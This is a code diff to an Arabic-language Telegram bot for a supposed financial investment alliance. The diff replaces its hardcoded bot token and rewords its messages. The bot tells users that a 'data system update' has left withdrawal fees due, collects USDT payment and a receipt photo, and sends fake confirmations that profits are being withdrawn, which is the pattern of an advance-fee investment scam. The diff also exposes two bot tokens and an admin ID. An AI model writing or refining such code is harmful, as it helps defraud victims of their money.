@@ -13,8 +13,8 @@ from telegram.ext import (
     filters,
 )
 
-# التوكن المعتمد للبوت
-TOKEN = "9056801472:AAHsVQ8Iwl_pa34_4gAYxakvY5y-r-vEjzU"
+# التوكن الجديد المعتمد للبوت
+TOKEN = "9014957370:AAHEFAt-9tIbs2qJvUPA-H4QBB2mn4f6v4M"
 ADMIN_ID = 7004113433  # معرف الأدمن الخاص بك
 SUPPORT_HANDLE = "@AbuAbdulAlziz"
 
@@ -137,7 +137,7 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="Markdown"
     )
 
-    # أزرار الأدمن تحت صورة الوصل (تم الدفع / رفض العملية)
+    # أزرار الأدمن تحت صورة الوصل (تم الدفع / رفض العملية) تصل إلى الأدمن 7004113433
     keyboard = [
         [
             InlineKeyboardButton("✅ تم الدفع بنجاح", callback_data=f"admin_approve_{user_id}"),
@@ -297,11 +297,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         target_user_id = int(parts[2])
 
         if action == "approve":
-            # إرسال رسالة نجاح السحب للزبون
             try:
                 await context.bot.send_message(
                     chat_id=target_user_id,
-                    text="✅ **تهانينا! تم تأكيد الدفع وعملية سحب أرباحك بنجاح.** جاري تحويل المبلغ إلى حسابك البنكي.",
+                    text="✅ **تهانينا! تم تأكيد الدفع وعملية سحب أرباحك بنجاح.** جاري تحويل المبلغ إلى حسابك.",
                     parse_mode="Markdown"
                 )
             except Exception as e:
@@ -313,11 +312,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
 
         elif action == "reject":
-            # إرسال رسالة الرفض للزبون
             try:
                 await context.bot.send_message(
                     chat_id=target_user_id,
-                    text="❌ **عذراً، تم رفض العملية لعدم قيامك بتحويل المبلغ المطلوب أو عدم صحة الوصل.** يرجى التأكد وإعادة المحاولة.",
+                    text="❌ **عذراً، لم تقم بدفع المبلغ أو تم رفض العملية.** يرجى التأكد وإعادة المحاولة.",
                     parse_mode="Markdown"
                 )
             except Exception as e:
@@ -365,7 +363,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
 
-        # إرسال الرسالة المحدثة الخاصة بتحديث نظام البيانات ورسوم السحب
         await query.edit_message_text(
             "عذرًا لقد تم للتو تحديث نظام البيانات. يرجى العلم بأن هناك رسوم سحب مستحقة على حسابكم، ولإتمام عملية دفع الرسوم يرجى الضغط على زر \"دفع\" أدناه، ثم رفع صورة الوصل ليتم تأكيد السحب بنجاح",
             reply_markup=reply_markup,
@@ -379,7 +376,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
     elif data == "pay_fees":
-        # تفاصيل دفع الرسوم المطلوبة بالكامل
         pay_details = (
             "💳 **دفع رسوم السحب:**\n\n"
             "العملة: **USDT**\n"
@@ -407,7 +403,7 @@ def main():
     app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     app.add_handler(CallbackQueryHandler(button_handler))
 
-    print("🤖 بوت تحالف المالية للإستثمار يعمل الآن بكامل أزرار تحكم الأدمن للرسوم...")
+    print("🤖 بوت تحالف المالية للإستثمار يعمل الآن بالتوكن الجديد وبأعلى كفاءة...")
     app.run_polling()
 
 if __name__ == "__main__":
